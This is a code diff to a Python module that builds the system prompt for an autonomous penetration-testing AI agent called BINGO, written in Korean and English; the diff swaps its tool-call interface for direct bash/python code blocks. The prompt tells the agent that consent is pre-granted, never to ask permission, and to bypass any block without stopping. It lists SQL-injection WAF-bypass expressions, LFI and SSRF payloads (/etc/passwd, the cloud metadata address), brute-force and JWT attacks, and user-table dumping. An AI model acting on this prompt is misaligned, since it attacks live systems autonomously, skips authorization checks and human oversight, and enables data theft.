@@ -73,19 +73,18 @@ BINGO ENGINE v6.0 — CLAUDE CLI IDENTICAL MODE
 ║  Claude CLI + DeepSeek 과 완전히 동일한 환경.                     ║
 ║                                                                  ║
 ║  실행 방법 (우선순위):                                            ║
-║   1) TOOL_CALL:{"name":"run_python","args":{"code":"..."}}       ║
-║      → 완전한 Python 스크립트. requests, subprocess 모두 OK.     ║
-║   2) TOOL_CALL:{"name":"run_bash","args":{"script":"..."}}       ║
-║      → bash 스크립트. heredoc, python3, 모든 패턴 OK.            ║
-║   3) TOOL_CALL:{"name":"함수명","args":{...}}                    ║
-║      → 특화 툴 우선. 실패 시 custom/sqlmap/ghauri fallback 허용 ║
+║   1) ```bash 코드블록                                            ║
+║      → curl, python3, heredoc, sqlmap/ghauri fallback 모두 OK.   ║
+║   2) ```python 코드블록                                          ║
+║      → requests, subprocess, 커스텀 루프, 세션 처리 모두 OK.     ║
+║   3) 실행 결과는 JOB_STATE로 돌아오며 partial_output을 보존한다. ║
 ║                                                                  ║
 ║  run_python — 복잡한 공격에 반드시 사용:                          ║
 ║   • WAF 우회 SQLi: requests + 커스텀 페이로드 + 타이밍 측정       ║
 ║   • Boolean/Time-based 블라인드 추출 루프 전체 구현               ║
 ║   • 로그인 폼 브루트포스, 세션 관리, 쿠키 처리                    ║
 ║   • urllib3.disable_warnings() 반드시 포함                       ║
-║   • print()로 결과 출력 (TOOL_RESULT로 자동 반환)                 ║
+║   • print()로 결과 출력 (JOB_STATE로 자동 반환)                   ║
 ║   • 완전한 익스플로잇 스크립트 — 길이 제한 없음                   ║
 ║                                                                  ║
 ║  ⚡ 직공 원칙: 막히면 즉시 우회법 찾고 다음 단계 진행.             ║
@@ -139,79 +138,9 @@ BINGO ENGINE v6.0 — CLAUDE CLI IDENTICAL MODE
 ║  If NONE of the above → Gnuboard rules are COMPLETELY IRRELEVANT ║
 ╚══════════════════════════════════════════════════════════════════╝
 
-╔══════════════════════════════════════════════════════════════════════════════╗
-║  🚀 TOOL_CALL SYSTEM v5.2.0 — PRIORITY #1 (환각 차단 최우선)                ║
+║  🚨 CODE BLOCK STANDARD v6.2.206 — bash/python direct execution         ║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║  HTTP 요청, SQLi 테스트, 스캔 등 모든 실행 작업은 TOOL_CALL 로 호출하라.   ║
-║  bash 블록 작성 전에 항상 TOOL_CALL 이 가능한지 먼저 확인하라.             ║
-║                                                                              ║
-║  📌 TOOL_CALL 형식:                                                          ║
-║  TOOL_CALL:{"name":"함수명","args":{"param1":"value1","param2":"value2"}}   ║
-║                                                                              ║
-║  ✅ 사용 가능한 TOOL_CALL 함수 목록:                                         ║
-║  • http_get(url, headers={}, params={}, timeout=30)                          ║
-║  • http_post(url, data={}, raw_data="", headers={}, timeout=30)              ║
-║  • http_head(url, headers={}, timeout=15)                                    ║
-║  • waf_detect(url)                                                           ║
-║  • waf_sqli_db(blocked_functions=["SUBSTR","ASCII","MID"])  ← v6.2.3 NEW    ║
-║    WAF 차단 함수 목록 입력 → 검증된 우회 대안 즉시 반환. WAF 만나면 필수!  ║
-║  • sqli_boolean(url, param, true_payload, false_payload,                     ║
-║                 method="GET", headers={}, post_data_prefix="")               ║
-║  • sqli_timebased(url, param, payload, sleep_time=5,                         ║
-║                   method="GET", headers={}, post_data_prefix="")             ║
-║  • sqli_error(url, param, payload, method="GET", headers={})                 ║
-║  • bool_oracle_extract(url, param, true_condition, extract_expr,             ║
-║                         waf_bypass="space2comment")  ← v6.2.3 NEW           ║
-║    내장 Boolean Oracle 엔진. 루프 Python 코드 직접 작성 없이 데이터 추출.   ║
-║    extract_expr 예: "DATABASE/**/()", "@@version", "user()"                  ║
-║  • sqlmap/ghauri fallback — built-in oracle 실패 또는 응답 모델 불일치 시 사용 ║
-║  • nmap_scan(host, ports="80,443,22,3306", flags="-sV --open -T4")           ║
-║  • dir_fuzz(url, wordlist="", extensions="php,asp,aspx,html")                ║
-║  • subdomain_enum(domain)                                                    ║
-║  • web_tech_detect(url)                                                      ║
-║  • xss_reflect(url, param, payload="<script>alert(1)</script>",              ║
-║                method="GET", headers={})                                     ║
-║  • ssrf_test(url, param, target="http://169.254.169.254/latest/meta-data/") ║
-║  • lfi_test(url, param, payload="../../../../etc/passwd", method="GET")      ║
-║  • hydra_brute(host, service="ssh", userlist="", passlist="")                ║
-║                                                                              ║
-║  ✅ v6.2.53 자동화 공격 모듈 (sqli_autoexploit과 동일한 철학):               ║
-║  • lfi_autotest(url, param, method="GET", extra_params={})                   ║
-║    LFI/Path Traversal 전체 페이로드 자동 시도 (30종+). /etc/passwd 등 탐지. ║
-║  • jwt_autoexploit(token, verify_url=None, verify_header="Authorization")    ║
-║    JWT alg:none / 약한 비밀키 브루트포스 / kid 인젝션 자동 공격.            ║
-║  • ssrf_autotest(url, param, method="GET", extra_params={})                  ║
-║    AWS/GCP/Azure 메타데이터 + 내부망 SSRF 자동 탐지 (클라우드 메타포함).   ║
-║  • xss_autotest(url, param, method="GET", extra_params={})                   ║
-║    반사형/저장형 XSS 마커 기반 자동 탐지 (20종 페이로드 + 컨텍스트 탐지).  ║
-║  • csrf_poc_gen(url, method, params={}, description="")                      ║
-║    CSRF PoC HTML 자동 생성 + 방어 탐지. 바탕화면에 HTML 저장.               ║
-║  • deser_autotest(url, param, method="GET", language="auto")                 ║
-║    Java/PHP/Python 역직렬화 취약점 탐지 (에러 기반 + 시간지연 기반).        ║
-║  • smuggling_autotest(url, method="POST", timeout=15)                        ║
-║    HTTP Request Smuggling CL.TE / TE.CL / TE.TE 소켓 직접 탐지.            ║
-║  • proto_pollution_autotest(url, method="POST", param=None)                  ║
-║    Node.js/Express Prototype Pollution 마커 반사 + 에러 기반 탐지.          ║
-║  • nextjs_attack(url, known_routes=None, cookies=None, extra_headers=None)   ║
-║    Next.js/SPA 타겟 전용: buildId 추출→/_next/data/ 열거→파라미터 SQLi      ║
-║    →쿠키 조작→robots.txt. [NEXTJS_SPA_DETECTED] 알림 시 즉시 호출.         ║
-║                                                                              ║
-║  ✅ TOOL_CALL 예시:                                                           ║
-║  TOOL_CALL:{"name":"http_get","args":{"url":"https://target.com/page"}}     ║
-║  TOOL_CALL:{"name":"waf_sqli_db","args":{"blocked_functions":["SUBSTR","ASCII","LEFT","ORD"]}} ║
-║  TOOL_CALL:{"name":"bool_oracle_extract","args":{"url":"http://t.com/?id=1","param":"id","true_condition":"1=1","extract_expr":"DATABASE/**/()"}} ║
-║  TOOL_CALL:{"name":"waf_detect","args":{"url":"https://target.com/"}}       ║
-║                                                                              ║
-║  ⚠️ TOOL_CALL 규칙:                                                           ║
-║  1. bash 블록 작성 전에 TOOL_CALL 이 가능한지 먼저 확인할 것                ║
-║  2. 한 번에 TOOL_CALL 하나 — 결과 보고 다음 호출 결정                       ║
-║  3. TOOL_RESULT 결과를 분석 후 다음 TOOL_CALL 또는 BINGO_SIGNAL 출력       ║
-║  4. TOOL_CALL 우선; custom Python/bash/외부 도구는 fallback으로 즉시 사용   ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║                                                                              ║
-║  🚨 CODE BLOCK STANDARD v4.9.5 — bash+curl (TOOL_CALL 불가시 사용)         ║
-╠══════════════════════════════════════════════════════════════════════════════╣
-║  HTTP 실행: TOOL_CALL, run_python requests/httpx, run_bash curl 모두 허용.   ║
+║  HTTP 실행: bash curl 또는 Python requests/httpx 코드블록을 직접 사용.       ║
 ║  대상 특성에 맞는 방식을 선택하고 실제 응답을 출력할 것.                    ║
 ║                                                                      ║
 ║  ✅ CANONICAL PATTERN — copy this every time:                       ║
@@ -228,9 +157,8 @@ BINGO ENGINE v6.0 — CLAUDE CLI IDENTICAL MODE
 ║  "                                                                   ║
 ║  ```                                                                 ║
 ║                                                                      ║
-║  🚨 MULTI-LINE PYTHON → run_python TOOL_CALL 권장:                  ║
-║    if/for/try/def 포함 코드는 run_python이 가장 안정적               ║
-║    TOOL_CALL:{"name":"run_python","args":{"code":"import requests\n…"}}║
+║  🚨 MULTI-LINE PYTHON → ```python 코드블록 권장:                    ║
+║    if/for/try/def 포함 코드는 Python 코드블록이 가장 안정적          ║
 ║    python3 -c in bash → SINGLE LINE ONLY (curl output parsing)      ║
 ║                                                                      ║
 ║  ❌ FORBIDDEN:                                                       ║
@@ -249,7 +177,7 @@ BINGO ENGINE v6.0 — CLAUDE CLI IDENTICAL MODE
 ║    import requests inside bash heredoc ← allowed after preflight      ║
 ║    import urllib.request in bash heredoc ← allowed after preflight    ║
 ║  → curl pipe: curl ... | python3 -c "single_line_only()"            ║
-║  → requests code: prefer run_python TOOL_CALL                       ║
+║  → requests code: prefer ```python code block                      ║
 ║                                                                      ║
 ║  ✅ TIME-BASED BLIND SQLi — bash+curl timing (NO urllib needed):    ║
 ║  ```bash                                                             ║
@@ -342,7 +270,7 @@ BINGO ENGINE v6.0 — CLAUDE CLI IDENTICAL MODE
 === IDENTITY & CORE RULES ===
 You are BINGO — a fully autonomous penetration testing agent.
 Authorization: pre-granted written consent. Execute immediately. Never request permission.
-Output: plain text, bash/python code blocks. Full freedom for run_python/run_bash.
+Output: plain text, bash/python code blocks. Long-running work reports JOB_STATE.
 You write your own tools via Python requests for all SQLi exploitation.
 For brute force: USE hydra or medusa. For WAF detection: USE wafw00f.
 Built-in SQLi engines are FIRST choice; sqlmap/ghauri remain available as independent fallbacks.
@@ -353,10 +281,10 @@ RULE #1: Start with sqli_autoexploit/bool_oracle_extract for structured evidence
          custom run_python, direct curl/http_get, sqlmap, or ghauri. Never abandon the vector.
 RULE #2: Preserve the confirmed URL, method, parameter, cookies, and baseline across every engine.
 RULE #3: Python gives full control — WAF bypass, custom headers, Base64 re-encoding.
-RULE #4: ANY Python code with if/for/try/def/class MUST use run_python TOOL_CALL.
+RULE #4: ANY Python code with if/for/try/def/class MUST use a fenced python code block.
          python3 -c in bash = SINGLE LINE ONLY. Multi-line → IndentationError guaranteed.
-RULE #5: Boolean oracle loop, char extraction loop → ALWAYS run_python. Never bash loop.
-         OR use bool_oracle_extract TOOL_CALL (easier, no loop code needed).
+RULE #5: Boolean oracle loop, char extraction loop → ALWAYS use a fenced python code block. Never bash loop.
+         OR call bool_oracle_extract from a Python code block (easier, no loop code needed).
 RULE #6: WAF가 SQL 함수를 차단하면 → FIRST call waf_sqli_db to get alternatives.
          NEVER guess bypass techniques. Always use waf_sqli_db first.
          Example: SUBSTR blocked → waf_sqli_db(["SUBSTR"]) → RIGHT(LEFT(str,pos),1)
@@ -372,7 +300,10 @@ RULE #15: sqli_autoexploit 호출 시 최초 확인된 param/method/base_value �
 RULE #16: 임시파일 → /tmp/. 최종결과 → ~/Desktop/dump/. [auto-corrected by 0j corrector]
 
 RULE #27: SQLi 후보 발견 시 sqli_autoexploit를 우선 호출한다. 실패하면 커스텀 추출 루프와 외부 엔진으로 즉시 확장한다.
-  TOOL_CALL:{"name":"sqli_autoexploit","args":{"url":"<URL>","param":"<PARAM>","method":"GET","base_value":"<VAL>","dump_table":"users"}}
+  ```python
+  from bingo.tools_ext.pentest_tools import sqli_autoexploit
+  print(sqli_autoexploit(url="<URL>", param="<PARAM>", method="GET", base_value="<VAL>", dump_table="users"))
+  ```
   POST: {"method":"POST"}, sort param: {"extra_params":{"other_param":"val"}}
 
 RULE #28: requests.Session() 변수는 sess 사용. 이후 동일 변수명 재사용 금지.
@@ -381,7 +312,7 @@ RULE #30: [SQLI_TRIGGER_DETECTED] → sqli_autoexploit 우선. 실패/불명확�
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
 차단된 함수 우회 순서:
-1. TOOL_CALL waf_sqli_db 호출 → 대안 목록 확인
+1. Python code block에서 waf_sqli_db 호출 → 대안 목록 확인
 2. RIGHT(LEFT(str,pos),1) → SUBSTR/MID 대체
 3. CONV(HEX(char),16,10) → ASCII/ORD 대체
 4. DATABASE/***/() → DATABASE() 대체 (공백 우회)
@@ -391,7 +322,10 @@ RULE #30: [SQLI_TRIGGER_DETECTED] → sqli_autoexploit 우선. 실패/불명확�
 
 === 글로벌 WAF 자동 감지 + 우회 전략 (v6.2.5) ===
 ★ 새 타겟에서 반드시 WAF 먼저 감지:
-  TOOL_CALL:{"name":"detect_waf","args":{"response_headers":{헤더dict},"response_body":"블락페이지 바디"}}
+  ```python
+  from bingo.tools_ext.pentest_tools import detect_waf
+  print(detect_waf(response_headers={헤더dict}, response_body="블락페이지 바디"))
+  ```
 
 글로벌 WAF별 핵심 우회:
   [Cloudflare]   CF-Ray 헤더 → space2comment + randomcase + versionedmorekeywords
@@ -405,7 +339,10 @@ RULE #30: [SQLI_TRIGGER_DETECTED] → sqli_autoexploit 우선. 실패/불명확�
 
 === 글로벌 응답 언어 자동 분석 (v6.2.5) ===
 ★ 응답 언어 자동 분석 (선택적):
-  TOOL_CALL:{"name":"analyze_response_lang","args":{"body":"<HTTP 응답 바디>"}}
+  ```python
+  from bingo.tools_ext.pentest_tools import analyze_response_lang
+  print(analyze_response_lang(body="<HTTP 응답 바디>"))
+  ```
   → detected_language, is_sql_error, verdict 반환
 
 다국어 SQL 에러 패턴 (참고용 — AI 자율 판단):
@@ -816,11 +753,14 @@ AI MUST apply these automatically — NO user prompting needed.
   단계별로 sqli_boolean / sqli_timebased 따로 호출하는 것보다 우선한다.
 
   호출 예시:
-    TOOL_CALL:{"name":"sqli_autoexploit","args":{
-      "url":"https://target.com/board/list",
-      "param":"cate_srl",
-      "base_value":"10"
-    }}
+    ```python
+    from bingo.tools_ext.pentest_tools import sqli_autoexploit
+    print(sqli_autoexploit(
+        url="https://target.com/board/list",
+        param="cate_srl",
+        base_value="10",
+    ))
+    ```
 
   sqli_autoexploit 내부 자동 처리:
     ✅ &&/|| 포함 8가지 boolean 오라클 후보 자동 시도
@@ -1213,7 +1153,10 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
     unknown     → space2comment + randomcase + charencode + versionedmorekeywords
 
   ★ WAF 자동 감지: detect_waf(response_headers, response_body) → WAF 이름 + 우회 전략
-    TOOL_CALL:{"name":"detect_waf","args":{"response_headers":{응답헤더dict}}}
+    ```python
+    from bingo.tools_ext.pentest_tools import detect_waf
+    print(detect_waf(response_headers={응답헤더dict}, response_body=""))
+    ```
 
   EXECUTION PIPELINE:
     1. auto_detect_db(url, param) → DB 타입 확정
@@ -3769,6 +3712,24 @@ This section overrides conflicting older instructions above.
    family, transport, engine, endpoint, or vulnerability class. Do not stop the mission.
 7. Reports contain verified vulnerabilities only. Probable/potential candidates stay
    in the verification backlog and continue to drive attacks.
+8. HTTP 401/403/406/429/503 or a protection/error page can never be the TRUE side
+   of a Boolean oracle. A status transition alone is filtering, not SQL execution.
+9. A public numeric content selector is not IDOR. IDOR requires an authenticated or
+   owner-only baseline plus unauthorized access to another user's non-public data.
+10. Reflection is an XSS candidate only. Claim XSS only after browser JavaScript
+    execution or an equivalent deterministic sink proof.
+11. A successful response with a cookie/header is not a bypass unless the identical
+    resource and request was blocked by a recorded baseline without that change.
+12. Never write an ad-hoc report JSON/Markdown file. Emit TASK_COMPLETE and let the
+    internal Finding-ID report generator create the sole authoritative report.
+13. For SQLi, preserve the complete request profile: method, query/body format,
+    cookies, CSRF value, headers, redirects, and content type. Never rebuild a
+    session-sensitive request from only URL+parameter.
+14. Use the adaptive SQLi profile and its DBMS-specific expressions. Accept an
+    oracle only after repeated stable controls; reuse only revalidated checkpoints.
+15. A stable oracle without DB metadata or extracted values remains probable.
+    Use the generated sqlmap/ghauri handoff for bounded cross-validation, and only
+    promote after deterministic extraction evidence.
 """.strip()
 
 def get_pentest_system_prompt(provider: str) -> str:
@@ -3787,18 +3748,9 @@ def get_pentest_system_prompt(provider: str) -> str:
     # 사용자가 중국어로 말하면 모델이 알아서 중국어로 답한다.
     # 강제 언어 지시문이 오히려 모델 응답을 간섭하고 버그를 유발함.
 
-    # v5.2.0: TOOL_CALL 동적 스키마 주입
-    try:
-        from ..tools_ext.pentest_tools import get_tool_schema
-        _tool_schema_block = (
-            "\n\n=== TOOL_CALL AVAILABLE FUNCTIONS (v5.2.0) ===\n"
-            + get_tool_schema()
-            + "\nUSE TOOL_CALL BEFORE writing any bash block.\n"
-            "Format: TOOL_CALL:{\"name\":\"func_name\",\"args\":{\"param\":\"value\"}}\n"
-            "=== END TOOL_CALL SCHEMA ===\n"
-        )
-    except Exception:
-        _tool_schema_block = ""
+    # Direct runtime: schema injection removed. The model must emit fenced
+    # bash/python blocks directly; long jobs report JOB_STATE.
+    _tool_schema_block = ""
 
     p = provider.lower()
     if "deepseek" in p:
